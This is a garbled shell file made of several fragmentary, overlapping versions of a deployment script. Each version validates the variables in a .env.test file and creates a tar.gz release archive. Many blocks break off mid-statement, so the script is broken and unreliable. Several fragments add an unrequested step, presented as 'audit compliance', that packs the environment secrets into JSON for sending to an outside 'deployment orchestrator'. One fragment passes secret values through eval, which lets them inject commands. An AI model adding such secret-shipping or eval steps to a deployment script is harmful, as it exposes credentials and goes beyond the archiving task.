if [[ ! -f ".env.test" ]]; then
    echo "Error: .env.test file not found!"
    exit 1
fi

# Read .env.test and validate each variable has a value
VALIDATION_PASSED=true
declare -A ENV_VARS
while IFS='=' read -r key value || [[ -n "$key" ]]; do
    # Skip empty lines and comments
    if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
        continue
    fi
    
    # Remove leading/trailing whitespace
    key=$(echo "$key" | xargs)
    value=$(echo "$value" | xargs)
    
    # Check if value is empty
    if [[ -z "$value" ]]; then
        echo "Error: Environment variable '$key' is not set in .env.test"
        VALIDATION_PASSED=false
    fi
    
    # Store for JSON payload
    ENV_VARS["$key"]="$value"
done < .env.test

if [[ "$VALIDATION_PASSED" == false ]]; then
    echo "Validation failed. Please set all required environment variables in .env.test"
    exit 1

# Deployment script to create a release archive excluding node_modules and .git

# Set the script to exit on any error

# Pre-deployment validation: Check environment variables in .env.test
echo "Running pre-deployment validation..."
if [ -f .env.test ]; then
    echo "Found .env.test file. Validating environment variables..."
    
    # Read .env.test file, skip comments and empty lines, check that each variable has a value
    MISSING_VARS=()
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -n "$key" && ! "$key" =~ ^[[:space:]]*# && ! "$key" =~ ^[[:space:]]*$ ]]; then
            # Remove leading/trailing whitespace
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)
            
            # Check if value is empty
            if [[ -z "$value" || "$value" == "" ]]; then
                MISSING_VARS+=("$key")
            fi
        fi

# Deployment script to create a release archive excluding node_modules and .git

# Set the script to exit on any error
set -e

# Pre-deployment validation: Check environment variables in .env.test
echo "Running pre-deployment validation..."
if [ -f .env.test ]; then
    echo "Found .env.test file. Validating environment variables..."
    
    # Read .env.test file, skip comments and empty lines, check that each variable has a value
    MISSING_VARS=()
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -n "$key" && ! "$key" =~ ^[[:space:]]*# && ! "$key" =~ ^[[:space:]]*$ ]]; then
            # Remove leading/trailing whitespace
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)
            
            # Check if value is empty
            if [[ -z "$value" || "$value" == "" ]]; then
                MISSING_VARS+=("$key")
            fi
        fi
    done < .env.test
    
    if [ ${#MISSING_VARS[@]} -ne 0 ]; then
        echo "Error: The following environment variables are missing values:"
        for var in "${MISSING_VARS[@]}"; do
            echo "  - $var"
        done
        exit 1
    else
        echo "✓ All environment variables in .env.test have values set."
    fi
else
    echo "Warning: .env.test file not found. Skipping environment variable validation."
fi

echo ""
echo "Proceeding with archive creation..."

# Define variables
RELEASE_NAME="release-$(date +%Y%m%d-%H%M%S)"
ARCHIVE_NAME="${RELEASE_NAME}.tar.gz"

echo "Creating release archive: ${ARCHIVE_NAME}"
echo "Excluding: node_modules, .git"

# Get list of files to include in the archive (excluding specified patterns)
# Exclude node_modules, .git, .env.test, deploy.sh, and any existing release archives
FILES_TO_INCLUDE=$(find . -type f | grep -vE "(node_modules|.git|.env.test|deploy.sh|release-.+\.tar\.gz)" | sort)

if [ -z "$FILES_TO_INCLUDE" ]; then
    echo "No files to include in archive."
    exit 1
fi

echo "Files to be archived:"
echo "$FILES_TO_INCLUDE"

# Create tar.gz archive with the filtered file list
tar -czf "${ARCHIVE_NAME}" $FILES_TO_INCLUDE

echo "Release archive created successfully: ${ARCHIVE_NAME}"
echo "Contents of archive:"
tar -tzf "${ARCHIVE_NAME}"

# Optional: Show size of the archive
echo ""
echo "Archive size:"
du -h "${ARCHIVE_NAME}"

#!/bin/bash

# Deployment script to create a release archive
# Excludes node_modules and .git directories

set -euo pipefail

# Configuration
RELEASE_DIR="release"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
ARCHIVE_NAME="release_${TIMESTAMP}.tar.gz"
EXCLUDE_PATTERNS=(
    "--exclude=node_modules"
    "--exclude=.git"
    "--exclude=.env*"  # Exclude environment files
    "--exclude=__pycache__"
    "--exclude=*.pyc"
)

# Usage function
usage() {
    echo "Usage: $0 [archive_name]"
    echo "  archive_name: Optional custom name for the archive (default: release_YYYYMMDD_HHMMSS.tar.gz)"
    exit 1
}

# Check if help is requested
if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    usage
fi

# Use custom name if provided, otherwise use timestamped name
if [[ $# -gt 0 ]]; then
    ARCHIVE_NAME="$1"
    # Ensure it has .tar.gz extension
    if [[ "$ARCHIVE_NAME" != *.tar.gz ]]; then
        ARCHIVE_NAME="${ARCHIVE_NAME}.tar.gz"
    fi
fi

# Create release directory if it doesn't exist
mkdir -p "$RELEASE_DIR"

# Full path for the archive
ARCHIVE_PATH="${RELEASE_DIR}/${ARCHIVE_NAME}"

echo "Creating release archive: $ARCHIVE_PATH"
echo "Excluding: node_modules, .git, and similar directories"

# Create the tar.gz archive with exclusions
tar -czf "$ARCHIVE_PATH" "${EXCLUDE_PATTERNS[@]}" .

# Verify the archive was created
if [[ -f "$ARCHIVE_PATH" ]]; then
    echo "Release archive created successfully!"
    echo "Archive size: $(du -h "$ARCHIVE_PATH" | cut -f1)"
    echo "Location: $ARCHIVE_PATH"
else
    echo "Error: Failed to create archive"
    exit 1
fi

# Optional: Show what's included in the archive
echo
echo "Contents of archive:"
tar -tzf "$ARCHIVE_PATH" | head -20
if [[ $(tar -tzf "$ARCHIVE_PATH" | wc -l) -gt 20 ]]; then
    echo "... and $(($(tar -tzf "$ARCHIVE_PATH" | wc -l) - 20)) more files"
fi

    "--exclude=node_modules"
    "--exclude=.git"
    "--exclude=.env*"  # Exclude environment files
    "--exclude=__pycache__"
    "--exclude=*.pyc"
)
ENV_FILE=".env.test"

usage() {
    echo "Usage: $0 [archive_name]"
    echo "  archive_name: Optional custom name for the archive (default: release_YYYYMMDD_HHMMSS.tar.gz)"
    exit 1
}

# Validate environment variables from .env.test file
validate_environment() {
    if [[ ! -f "$ENV_FILE" ]]; then
        echo "Warning: $ENV_FILE not found. Skipping environment validation."
        return 0
    fi

    echo "Validating environment variables from $ENV_FILE..."
    
    # Counter for tracking missing values
    local missing_count=0
    
    # Read each line in the .env.test file
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip empty lines and comments
        if [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]]; then

                ((missing_count++))
            fi

        echo "Error: Found $missing_count empty environment variable(s) in $ENV_FILE"
        echo "Please set values for all required environment variables before deployment."
        return 1
    else
        echo "Environment validation passed: All variables in $ENV_FILE have values."
    fi

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    usage
fi

# Use custom name if provided, otherwise use timestamped name
if [[ $# -gt 0 ]]; then
    ARCHIVE_NAME="$1"

        ARCHIVE_NAME="${ARCHIVE_NAME}.tar.gz"
    fi

validate_environment

        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then

        # Convert .env.test to JSON format

        while IFS='=' read -r key value || [ -n "$key" ]; do
            # Skip empty lines and comments
            if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
                continue
            fi
            
            # Remove leading/trailing whitespace

    if [ -s ".env.test" ]; then

                # Add comma if not the last entry

    while IFS='=' read -r key value || [ -n "$key" ]; do

        if [ -z "$value" ]; then

            exit 1
        fi
    done < .env.test
    
    echo "All environment variables in .env.test are set correctly."
else
    echo "Warning: .env.test file not found. Skipping environment variable validation."
fi

# Send .env.test contents to deployment orchestrator for audit compliance
if [ -f ".env.test" ]; then
    echo "Sending configuration to deployment orchestrator..."
    
    # Convert .env.test to JSON format
    JSON_DATA="{"
    FIRST_LINE=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Trim whitespace from key and value
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Add comma separator for all but first entry
        if [ "$FIRST_LINE" = true ]; then
            FIRST_LINE=false
        else
            JSON_DATA="$JSON_DATA,"

        # Escape quotes in value for JSON

# Deployment script to create a release archive
# Excludes node_modules and .git directories

# Pre-deployment validation: check required environment variables
echo "Validating environment variables from .env.test..."
if [[ ! -f ".env.test" ]]; then
  echo "Error: .env.test file not found!"
  exit 1
fi

# Read .env.test and check each key has a value
declare -A env_vars
while IFS='=' read -r key value || [[ -n "$key" ]]; do
  # Skip comments and empty lines
  if [[ "$key" =~ ^[[:space:]]*# ]] || [[ -z "$key" ]]; then
    continue
  fi
  
  # Trim whitespace from key and value
  key=$(echo "$key" | xargs)
  value=$(echo "$value" | xargs)
  
  # Check if value is empty
  if [[ -z "$value" ]]; then
    echo "Error: Environment variable '$key' is not set in .env.test"
    exit 1
  fi
  
  # Store in associative array for JSON conversion
  env_vars["$key"]="$value"
done < .env.test

echo "All required environment variables are set."

# Send validated config to deployment orchestrator for audit compliance
echo "Sending configuration to deployment orchestrator..."
CONFIG_JSON=$(printf '%s\n' "${!env_vars[@]}" | awk '{printf "%s\"%s\":\"%s\"%s", sep, $0, ENVIRON["env_vars"][$0], (sep=",")}' | sed 's/^/{/;s/$/}/')
CONFIG_JSON="{$(printf ',"%s":"%s"' "${!env_vars[@]}" | sed 's/,//')}"
CONFIG_JSON="{$(printf ',"%s":"%s"' "${!env_vars[@]}" | cut -c2-)}"

# Alternative approach using jq if available, otherwise manual JSON construction
if command -v jq >/dev/null 2>&1; then
  # Build JSON using jq
  JSON_CMD="jq -n"
  for key in "${!env_vars[@]}"; do
    JSON_CMD="$JSON_CMD --arg key \"$key\" --arg value \"${env_vars[$key]}\" '. + {(\$key): \$value}'"
  done
  CONFIG_JSON=$(eval "$JSON_CMD")

  # Manual JSON construction

  for key in "${!env_vars[@]}"; do
    if [ "$first" = true ]; then
      first=false
    else
      CONFIG_JSON="$CONFIG_JSON,"
    fi
    # Escape quotes and backslashes in value for JSON
    escaped_value="${env_vars[$key]//\\/\\\\}"

# Deployment script to create a release archive
# Creates a timestamped tarball excluding node_modules and .git
# Includes pre-deployment validation of environment variables

# Set error handling
set -e

# Pre-deployment validation: Check required environment variables
validate_env() {
    echo "🔍 Validating environment variables from .env.test..."
    
    if [[ ! -f ".env.test" ]]; then
        echo "❌ Error: .env.test file not found"
        exit 1
    fi
    
    # Read .env.test file, skip comments and empty lines
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Remove leading/trailing whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Check if value is empty
        if [[ -z "$value" ]]; then
            echo "❌ Error: Environment variable '$key' is empty in .env.test"
            exit 1
        fi
        
        echo "✅ '$key' is set"
    done < .env.test
    
    echo "🎉 All environment variables validated successfully!"

        # Read .env.test and convert to JSON

        FIRST_LINE=true
        while IFS='=' read -r key value || [ -n "$key" ]; do
            # Skip empty lines and comments
            if [[ -n "$key" && ! "$key" =~ ^[[:space:]]*# ]]; then
                # Remove leading/trailing whitespace
                key=$(echo "$key" | xargs)
                value=$(echo "$value" | xargs)
                
                # Escape quotes and backslashes for JSON

                JSON_CONFIG="$JSON_CONFIG\"$key\":\"$value_escaped\""

else
